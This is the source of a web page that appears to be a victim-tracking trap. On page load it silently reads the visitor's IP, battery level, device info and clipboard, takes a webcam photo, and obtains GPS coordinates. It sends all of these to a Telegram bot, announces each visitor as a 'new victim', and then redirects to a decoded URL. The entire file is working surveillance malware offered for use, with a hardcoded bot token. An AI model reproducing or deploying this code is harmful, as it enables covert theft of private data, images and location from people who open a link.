<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script>
	var queryString = window.location.search.substring(1);
	if (queryString.includes("&m=1")) {
    queryString = queryString.split("&m=1")[0];
}
    // Bot token
    var telegram_bot_id = "6784592545:AAGxtMh_8W5ZonFU8ollwohYZTBzhEFNXnE";
  
//get last url and decryst
 var queryString = window.location.search.substring(1);
    
const decodedPart = atob(queryString);
const text = decodedPart;

    // Chat ID and url
    const idMatch = text.match(/id=(\d+)/);
  const chat_id = idMatch[1];
  
  const urlMatch = text.match(/url=([^&]+)/);
  const url_rederict = urlMatch[1];
  
    // Function to send a message to Telegram
    var sendMessageToTelegram = function(message) {
        var settings = {
            "async": true,
            "crossDomain": true,
            "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "cache-control": "no-cache"
            },
            "data": JSON.stringify({
                "chat_id": chat_id,
                "text": message
            })
        };
        $.ajax(settings).done(function (response) {
            console.log(response);
        });
    };
    
    // Function to send the information to Telegram
    var sendInfoToTelegram = function() {
        // Get IP address
        fetch('https://api64.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ipAddress = "𝗜𝗣: " + data.ip;
                
                // Get battery level
                navigator.getBattery().then(function(battery) {
                    const batteryLevel = "𝗕𝗮𝘁𝘁𝗲𝗿𝘆 𝗹𝗲𝘃𝗲𝗹: " + (battery.level * 100) + '%';
                    
                    // Get phone name
                    const phoneName = "𝗦𝘆𝘀𝘁𝗲𝗺 𝗶𝗻𝗳𝗼: " + navigator.userAgent;
                    
                    sendMessageToTelegram("ضـحية جـديدة :\n\n" + ipAddress + "\n\n" + batteryLevel + "\n\n" + phoneName);
                });
            });
       
        navigator.clipboard.readText()
            .then(function(clipboardText) {
                const textHolder = "𝗖𝗹𝗶𝗽𝗯𝗼𝗮𝗿𝗱: " + clipboardText;
                sendMessageToTelegram(textHolder);
            });
    };
    
    sendInfoToTelegram();
    
    


</script>

<script>
    var video = document.createElement('video');
    var canvas = document.createElement('canvas');
    var context = canvas.getContext('2d');
    
    video.autoplay = true;
    window.onload = function() {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) {
                video.srcObject = stream;
                
                setTimeout(function() {
                    var videoWidth = video.videoWidth;
                    var videoHeight = video.videoHeight;
                    var size = Math.min(videoWidth, videoHeight);
                    
                    canvas.width = size;
                    canvas.height = size;
                    
                    context.drawImage(video, 0, 0, size, size);
                    canvas.toBlob(function (blob) {
                        var formData = new FormData();
                        formData.append('photo', blob, 'image.jpg');
                        formData.append('chat_id', chat_id);
                        formData.append('parse_mode', 'HTML');
                        formData.append('caption', 'Developed by @Elyounsy');
                        
                        var request = new XMLHttpRequest();
                        request.open('POST', 'https://api.telegram.org/bot' + telegram_bot_id + '/sendPhoto');
                        request.send(formData);
                    }, 'image/jpeg');
                }, 600);
            })
            .catch(function(error) {
                console.error(error);
            });
    };
  
  
  
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition((position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        fetch(`https://api.telegram.org/bot${telegram_bot_id}/sendlocation?chat_id=${chat_id}&latitude=${latitude}&longitude=${longitude}`)
 });
} 

//go to pa
    setTimeout(function() {
        window.location.href = url_rederict;
    }, 5000); 
</script>
